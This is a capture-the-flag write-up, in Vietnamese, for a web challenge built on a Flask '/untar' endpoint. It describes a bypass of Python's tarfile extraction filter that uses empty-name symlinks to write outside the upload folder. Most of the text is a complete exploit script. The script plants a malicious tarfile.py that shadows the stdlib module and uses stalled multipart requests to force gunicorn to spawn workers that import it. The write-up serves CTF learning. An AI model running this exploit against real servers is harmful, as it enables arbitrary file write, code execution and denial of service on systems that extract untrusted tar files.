## web/The Real TARget
### Challenge Description

Challenge chỉ cho một endpoint duy nhất:

`/untar`

Ý tưởng của bài là: ta gửi một file .tar, server sẽ giải nén nó. Mục tiêu là lợi dụng quá trình giải nén để đọc được flag trên server.

### Initial Analysis

Source chính của app:
```
@app.route('/untar', methods=['POST'])
def untar_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file and file.filename.endswith('.tar'):
        user_id = uuid.uuid4().hex
        upload_id = uuid.uuid4().hex
        UPLOAD_FOLDER = os.path.join(os.getcwd(), 'uploads', user_id, upload_id)

        os.makedirs(UPLOAD_FOLDER, exist_ok=True)

        try:
            with tarfile.open(fileobj=file, mode='r') as tar:
                tar.extractall(path=UPLOAD_FOLDER)

            shutil.rmtree(
                os.path.join(os.getcwd(), 'uploads', user_id),
                ignore_errors=True
            )

            return jsonify({'message': 'File untarred successfully'}), 200
        except Exception as e:
            return jsonify({'error': repr(e)}), 500
```
Server nhận file .tar, giải nén vào:

`/app/uploads/<user_id>/<upload_id>`

Sau đó xóa thư mục:

`/app/uploads/<user_id>`

Flag được đặt ở root với tên random:

`/flag-<uuid>.txt`

Vì tên flag random nên không thể đoán trực tiếp đường dẫn flag.

Ban đầu tôi nghĩ đến path traversal kiểu:

`../../app/static/flag.txt`

hoặc symlink trỏ ra ngoài thư mục upload.

Tuy nhiên challenge dùng:

`Python 3.14.5`

Ở bản này, tarfile.extractall() mặc định dùng data_filter, nên các payload cổ điển như:

`../`
- absolute path
- symlink ra ngoài thư mục extract
- hardlink ra ngoài thư mục extract

**đều bị chặn.**

Vì vậy đây không phải bài Zip Slip/Tar Slip cơ bản.

### The Real Vulnerability

Lỗ hổng nằm ở cách tarfile xử lý symlink có tên rỗng.

Ta có thể tạo tar chứa các entry như sau:
```
1. symlink "" -> "."
2. symlink "a" -> "p/q/r"
3. symlink "" -> "a/../../../"
4. file "tarfile.py"
```
Điểm quan trọng nằm ở entry thứ 3.

Filter kiểm tra linkname ban đầu:

`a/../../../`

Nhưng khi tạo symlink thật trên filesystem, tarfile normalize linkname này thành:

`../..`

Từ thư mục extract:

`/app/uploads/<user_id>/<upload_id>`

symlink `../..` sẽ resolve về:

`/app`

Kết quả là thư mục extract bị biến thành symlink trỏ tới `/app`.

Sau đó khi tar tiếp tục extract file:

tarfile.py

file thực tế được ghi ra:

`/app/tarfile.py`

Như vậy ta có primitive:

arbitrary file write vào `/app`
Exploitation Idea

Trong `/app/app.py` có dòng:

`import tarfile`

Python sẽ ưu tiên import module trong current directory trước stdlib.

Nếu ta ghi được file:

`/app/tarfile.py`

thì khi worker mới của gunicorn được spawn, nó sẽ import nhầm file của ta thay vì stdlib tarfile.

Nội dung `/app/tarfile.py`:
```
import glob,builtins,os

p = glob.glob('/flag-*')[0]

os.makedirs('/app/static', exist_ok=True)

builtins.open('/app/static/flag.txt', 'w').write(
    builtins.open(p).read()
)
```
Payload này tìm flag bằng:

`glob.glob('/flag-*')`

rồi ghi nội dung flag ra:

`/app/static/flag.txt`

Sau đó ta chỉ cần truy cập:

`/static/flag.txt`
Triggering New Gunicorn Worker

Sau khi ghi `/app/tarfile.py`, payload chưa chạy ngay vì các worker hiện tại đã `import stdlib tarfile` từ trước.

Ta cần làm `gunicorn spawn worker` mới.

Trên local có thể restart Docker, nhưng trên remote thì không. Vì vậy ta ép gunicorn worker timeout bằng incomplete multipart request.

### Idea

Gửi request tới `/untar` với:
```
Content-Length: 900
Content-Type: multipart/form-data; boundary=x
```
**Content-Length nhỏ hơn giới hạn:**

`app.config['MAX_CONTENT_LENGTH'] = 1024`

Nhưng ta chỉ gửi một phần body, không gửi đủ multipart body và giữ socket mở.

Flask sẽ bị kẹt khi parse:

`request.files`

Gunicorn sync worker bị treo quá timeout, master sẽ kill worker đó và spawn worker mới.

**Worker mới import lại app, gặp:**

`import tarfile`

và import `/app/tarfile.py` của ta, từ đó payload đọc flag được thực thi.

### Exploit Script
```
#!/usr/bin/env python3
import sys
import io
import tarfile
import bz2
import http.client
import urllib.parse
import urllib.request
import socket
import threading
import time


def build_write_payload():
    evil_module = (
        "import glob,builtins,os\n"
        "p=glob.glob('/flag-*')[0]\n"
        "os.makedirs('/app/static',exist_ok=True)\n"
        "builtins.open('/app/static/flag.txt','w').write(builtins.open(p).read())\n"
    ).encode()

    bio = io.BytesIO()

    with tarfile.open(fileobj=bio, mode="w") as tf:
        def symlink(name, target):
            ti = tarfile.TarInfo(name)
            ti.type = tarfile.SYMTYPE
            ti.linkname = target
            ti.mode = 0o777
            ti.mtime = 0
            tf.addfile(ti)

        symlink("", ".")
        symlink("a", "p/q/r")
        symlink("", "a/../../../")

        ti = tarfile.TarInfo("tarfile.py")
        ti.size = len(evil_module)
        ti.mode = 0o644
        ti.mtime = 0
        tf.addfile(ti, io.BytesIO(evil_module))

    return bz2.compress(bio.getvalue(), compresslevel=9)


def post_tar(base_url, payload):
    u = urllib.parse.urlparse(base_url)
    host = u.hostname
    port = u.port or 80
    path = "/untar"

    boundary = "x"

    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="x.tar"\r\n'
        "Content-Type: application/x-tar\r\n"
        "\r\n"
    ).encode() + payload + f"\r\n--{boundary}--\r\n".encode()

    print(f"[+] payload size: {len(body)} bytes")

    conn = http.client.HTTPConnection(host, port, timeout=15)

    conn.request(
        "POST",
        path,
        body=body,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
        },
    )

    res = conn.getresponse()
    print("[+] upload:", res.status, res.read().decode(errors="replace"))
    conn.close()


def read_flag(base_url):
    try:
        with urllib.request.urlopen(base_url.rstrip("/") + "/static/flag.txt", timeout=5) as r:
            data = r.read().decode(errors="replace")

            if data.strip():
                print("[+] FLAG:")
                print(data)
                return True

    except Exception as e:
        print("[-] flag not ready:", e)

    return False


def hold_incomplete_multipart(base_url):
    u = urllib.parse.urlparse(base_url)
    host = u.hostname
    port = u.port or 80

    boundary = "x"
    content_length = 900

    prefix = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="x.tar"\r\n'
        "Content-Type: application/x-tar\r\n"
        "\r\n"
    ).encode()

    req = (
        "POST /untar HTTP/1.1\r\n"
        f"Host: {u.netloc}\r\n"
        "Connection: keep-alive\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {content_length}\r\n"
        "\r\n"
    ).encode()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)

    try:
        s.connect((host, port))
        s.sendall(req)
        s.sendall(prefix)

        end = time.time() + 75

        while time.time() < end:
            s.sendall(b"A")
            time.sleep(10)

    except Exception:
        pass

    finally:
        try:
            s.close()
        except Exception:
            pass


def force_restart(base_url):
    for wave in range(3):
        print(f"[+] slow multipart wave {wave + 1}")

        for _ in range(10):
            threading.Thread(
                target=hold_incomplete_multipart,
                args=(base_url,),
                daemon=True
            ).start()

        for _ in range(16):
            time.sleep(5)

            if read_flag(base_url):
                return True

    return False


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} http://HOST:PORT")
        return

    base_url = sys.argv[1].rstrip("/")

    print("[+] writing /app/tarfile.py")
    post_tar(base_url, build_write_payload())

    if read_flag(base_url):
        return

    print("[+] forcing gunicorn worker restart")
    force_restart(base_url)


if __name__ == "__main__":
    main()
```
### Running the Exploit
Chạy Exploite

![Running the Exploit](https://lh3.googleusercontent.com/u/0/d/1EKWlRrn9s7cX7uTUXkYjJMlM0zVox-GY)
Flag: `HCMUS-CTF{CVE-2026-7774_Fr3sh_0ut_0f_th3_0v3n!}`